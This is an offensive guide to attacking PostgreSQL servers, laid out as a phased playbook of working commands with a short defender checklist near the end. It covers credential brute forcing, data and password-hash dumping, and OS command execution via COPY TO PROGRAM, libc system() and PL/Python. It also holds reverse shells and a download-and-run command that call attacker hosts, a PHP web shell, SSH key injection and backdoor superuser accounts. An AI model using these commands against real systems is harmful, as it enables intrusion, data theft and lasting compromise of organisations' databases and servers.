# Port 5432 - PostgreSQL - Complete Attack Guide

## Overview

**Protocol**: PostgreSQL Database
**Port**: 5432 (default)
**Transport**: TCP
**Encryption**: Optional (SSL/TLS)
**Authentication**: Password, MD5, SCRAM-SHA-256, Certificate, GSSAPI

## Attack Objectives

- **Credential Brute Force**: Crack database credentials
- **Command Execution**: Execute OS commands via extensions
- **Data Extraction**: Dump databases and tables
- **File Read/Write**: Access filesystem
- **Privilege Escalation**: Gain superuser access
- **Code Execution**: Via procedural languages (PL/pgSQL, PL/Python)

## Attack Methodology

### Phase 1: Discovery and Reconnaissance

**1.1 Detect PostgreSQL Service**
```bash
# Quick scan
nmap -p 5432 192.168.1.100

# Service version
nmap -p 5432 -sV 192.168.1.100

# PostgreSQL scripts
nmap -p 5432 --script pgsql-brute 192.168.1.100

# Network-wide discovery
nmap -p 5432 192.168.1.0/24 --open
```

**1.2 Banner Grabbing**
```bash
# Using psql
psql -h 192.168.1.100 -U postgres

# Using Nmap
nmap -p 5432 --script banner 192.168.1.100

# PostgreSQL version
echo "SELECT version();" | psql -h 192.168.1.100 -U postgres
```

**1.3 Initial Connection Test**
```bash
# Try default postgres user (no password)
psql -h 192.168.1.100 -U postgres

# Common databases
psql -h 192.168.1.100 -U postgres -d postgres
psql -h 192.168.1.100 -U postgres -d template1

# List databases (if connection successful)
psql -h 192.168.1.100 -U postgres -c "\l"
```

### Phase 2: Credential Attacks

**2.1 Default Credentials**
```bash
# Common defaults
postgres:[blank]
postgres:postgres
postgres:password
postgres:admin
admin:admin
user:user

# Try defaults
psql -h 192.168.1.100 -U postgres
psql -h 192.168.1.100 -U postgres -W  # Prompt for password
```

**2.2 Brute Force Attack**

**Using Hydra**:
```bash
# Single user
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://192.168.1.100

# Multiple users
hydra -L users.txt -P passwords.txt postgres://192.168.1.100

# Specific database
hydra -l postgres -P passwords.txt postgres://192.168.1.100/postgres

# Limit threads
hydra -l postgres -P passwords.txt postgres://192.168.1.100 -t 4
```

**Using Medusa**:
```bash
medusa -h 192.168.1.100 -u postgres -P passwords.txt -M postgres
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M postgres -m DATABASE:postgres
```

**Using Metasploit**:
```bash
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 192.168.1.100
set USERNAME postgres
set PASS_FILE passwords.txt
run
```

**Using Nmap**:
```bash
nmap -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.100
```

**2.3 Password Spraying**
```bash
# Try common password against multiple users
for user in postgres admin root dbadmin; do
  psql -h 192.168.1.100 -U $user -c "SELECT version();" 2>&1 | grep -i "version"
done

# Using Hydra
hydra -L users.txt -p "Password123" postgres://192.168.1.100
```

### Phase 3: Post-Authentication Enumeration

**3.1 Database Enumeration**
```bash
# Connect
psql -h 192.168.1.100 -U postgres

# List databases
\l
SELECT datname FROM pg_database;

# List tables in current database
\dt
SELECT tablename FROM pg_tables WHERE schemaname='public';

# List schemas
\dn
SELECT schema_name FROM information_schema.schemata;

# List users/roles
\du
SELECT usename FROM pg_user;
SELECT rolname FROM pg_roles;
```

**3.2 Privilege Check**
```bash
# Check current user
SELECT current_user;
SELECT session_user;

# Check if superuser
SELECT usesuper FROM pg_user WHERE usename = current_user;

# List superusers
SELECT usename FROM pg_user WHERE usesuper = true;

# Check user privileges
SELECT * FROM information_schema.table_privileges WHERE grantee = current_user;
```

**3.3 Extract Sensitive Data**
```bash
# Switch to database
\c database_name

# Dump table
SELECT * FROM users;
SELECT * FROM passwords;
SELECT * FROM credit_cards;

# Count records
SELECT COUNT(*) FROM users;

# Export to CSV
\copy (SELECT * FROM users) TO '/tmp/users.csv' CSV HEADER;

# Or from command line
psql -h 192.168.1.100 -U postgres -d dbname -c "SELECT * FROM users" > dump.txt
```

**3.4 Password Hash Extraction**
```bash
# Get password hashes
SELECT usename, passwd FROM pg_shadow;

# PostgreSQL < 10
SELECT usename, passwd FROM pg_shadow;

# PostgreSQL 10+
SELECT rolname, rolpassword FROM pg_authid;

# Export hashes
psql -h 192.168.1.100 -U postgres -c "SELECT rolname, rolpassword FROM pg_authid WHERE rolpassword IS NOT NULL" > hashes.txt

# Crack with hashcat
# PostgreSQL MD5: hashcat -m 12
hashcat -m 12 hashes.txt rockyou.txt
```

### Phase 4: Command Execution

**4.1 Using COPY TO/FROM PROGRAM (PostgreSQL 9.3+)**
```bash
# Requires superuser privileges

# Execute command and save output
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(cmd_output text);
COPY cmd_output FROM PROGRAM 'whoami';
SELECT * FROM cmd_output;

# Without creating table
COPY (SELECT '') TO PROGRAM 'id > /tmp/id.txt';

# Reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"';

# Download and execute
COPY (SELECT '') TO PROGRAM 'wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh';
```

**4.2 Using PL/pgSQL**
```bash
# Create function that executes commands
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;

# Execute command
SELECT system('whoami > /tmp/whoami.txt');
SELECT system('nc attacker_ip 4444 -e /bin/bash');

# Clean up
DROP FUNCTION system(cstring);
```

**4.3 Using PL/Python (if installed)**
```bash
# Check if PL/Python installed
SELECT * FROM pg_language WHERE lanname = 'plpythonu';

# Create function
CREATE OR REPLACE FUNCTION exec_cmd(cmd text) RETURNS text AS $$
import subprocess
return subprocess.check_output(cmd, shell=True)
$$ LANGUAGE plpythonu;

# Execute
SELECT exec_cmd('whoami');
SELECT exec_cmd('id');

# Reverse shell
SELECT exec_cmd('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker_ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"');
```

**4.4 Using PL/Perl (if installed)**
```bash
# Create Perl function
CREATE OR REPLACE FUNCTION perl_cmd(text) RETURNS text AS $$
  use strict;
  my $cmd = $_[0];
  my $output = `$cmd`;
  return $output;
$$ LANGUAGE plperl;

# Execute
SELECT perl_cmd('whoami');
```

### Phase 5: File System Access

**5.1 Read Files**
```bash
# Read file (requires superuser or pg_read_file role)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/var/www/html/config.php');

# Read entire file
CREATE TABLE file_content(content text);
COPY file_content FROM '/etc/passwd';
SELECT * FROM file_content;

# Using lo_import (large objects)
SELECT lo_import('/etc/passwd', 12345);
SELECT * FROM pg_largeobject WHERE loid = 12345;
```

**5.2 Write Files**
```bash
# Write to file
COPY (SELECT 'test content') TO '/tmp/test.txt';

# Write web shell
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

# Write SSH key
COPY (SELECT 'ssh-rsa AAAA...') TO '/home/user/.ssh/authorized_keys';

# Using lo_export
SELECT lo_from_bytea(12345, 'malicious content');
SELECT lo_export(12345, '/tmp/malicious.txt');
```

**5.3 Directory Listing**
```bash
# List directory (PostgreSQL 9.1+)
SELECT pg_ls_dir('/etc/');
SELECT pg_ls_dir('/home/');
SELECT pg_ls_dir('/var/www/html/');

# Get file info
SELECT pg_stat_file('/etc/passwd');
```

### Phase 6: Privilege Escalation

**6.1 Create Superuser**
```bash
# If current user has CREATEROLE privilege
CREATE ROLE hacker WITH SUPERUSER LOGIN PASSWORD 'password';

# Or modify existing user
ALTER ROLE existing_user WITH SUPERUSER;

# Connect as new superuser
psql -h 192.168.1.100 -U hacker -d postgres
```

**6.2 Exploit CVEs**
```bash
# CVE-2019-9193 (PostgreSQL 9.3 - 11.2)
# Authenticated arbitrary command execution via "COPY TO/FROM PROGRAM"
# See Phase 4.1

# Other CVEs
nmap -p 5432 --script vuln 192.168.1.100
```

### Phase 7: Persistence

**7.1 Create Backdoor User**
```bash
# Create hidden user
CREATE ROLE backdoor WITH SUPERUSER LOGIN PASSWORD 'SecurePass123!';

# Grant all privileges
GRANT ALL PRIVILEGES ON DATABASE postgres TO backdoor;
```

**7.2 Malicious Trigger**
```bash
# Create trigger that executes on certain events
CREATE OR REPLACE FUNCTION backdoor_trigger() RETURNS TRIGGER AS $$
BEGIN
  PERFORM pg_sleep(0.1);
  -- Execute backdoor code
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER backdoor_trig AFTER INSERT ON some_table
FOR EACH ROW EXECUTE FUNCTION backdoor_trigger();
```

## Bypass Techniques

### Bypassing pg_hba.conf Restrictions
```bash
# pg_hba.conf controls authentication
# If restricted by IP, may need to:
# 1. Use allowed IP (if you compromised that host)
# 2. SSH tunnel through allowed host
ssh -L 5433:192.168.1.100:5432 user@allowed_host
psql -h localhost -p 5433 -U postgres

# 3. Modify pg_hba.conf if you have file write
# Add: host all all 0.0.0.0/0 trust
```

### Bypassing SSL Requirement
```bash
# If server requires SSL
psql "sslmode=require host=192.168.1.100 user=postgres dbname=postgres"

# Disable SSL verification
psql "sslmode=allow host=192.168.1.100 user=postgres"
```

## Information Extraction

**Critical Queries**:
```sql
-- Version
SELECT version();

-- Current user and database
SELECT current_user, current_database();

-- List databases
SELECT datname FROM pg_database;

-- List tables
SELECT tablename FROM pg_tables WHERE schemaname='public';

-- List users
SELECT usename, usesuper FROM pg_user;

-- Database size
SELECT pg_database_size(current_database());

-- Connection info
SELECT * FROM pg_stat_activity;
```

## Security Recommendations

**For Defenders**:
1. **Strong Passwords** - Complex passwords for all users
2. **Restrict Network** - pg_hba.conf to limit IPs
3. **Disable Superuser Remote** - Local only
4. **SSL/TLS** - Encrypt connections
5. **Remove PL Languages** - Unless needed (PL/Python, PL/Perl)
6. **Least Privilege** - Don't grant SUPERUSER freely
7. **Audit Logging** - Enable query logging
8. **Disable COPY PROGRAM** - If not needed
9. **Update PostgreSQL** - Patch known vulnerabilities
10. **Network Segmentation** - Firewall PostgreSQL access

## Practical Attack Scenario

```bash
# Discovery
nmap -p 5432 192.168.1.100
# PostgreSQL 12.3 detected

# Try default credentials
psql -h 192.168.1.100 -U postgres
# Failed - password required

# Brute force
hydra -l postgres -P top1000.txt postgres://192.168.1.100
# SUCCESS: postgres:admin

# Connect and enumerate
psql -h 192.168.1.100 -U postgres
SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;
# postgres | t (superuser!)

# Extract data
\l
\c sensitive_db
SELECT * FROM users WHERE role='admin';
# Got admin credentials!

# Execute commands
COPY (SELECT '') TO PROGRAM 'id';
# Command execution works!

# Get reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"';
# Shell received!

# Full system compromise
```

## Tools Summary

**Best Tool for Each Task**:
- **Discovery**: Nmap
- **Brute Force**: Hydra, Metasploit
- **Enumeration**: psql, pgAdmin
- **Exploitation**: psql (COPY TO PROGRAM)
- **Hash Cracking**: Hashcat

## Related Attacks

- **Port 3306 (MySQL)**: Similar database attacks
- **Port 1433 (MSSQL)**: Similar command execution
- **Port 80/443**: Web apps often expose DB creds
- **File System**: Can read web configs, SSH keys

---

**Last Updated**: 2026-06-16
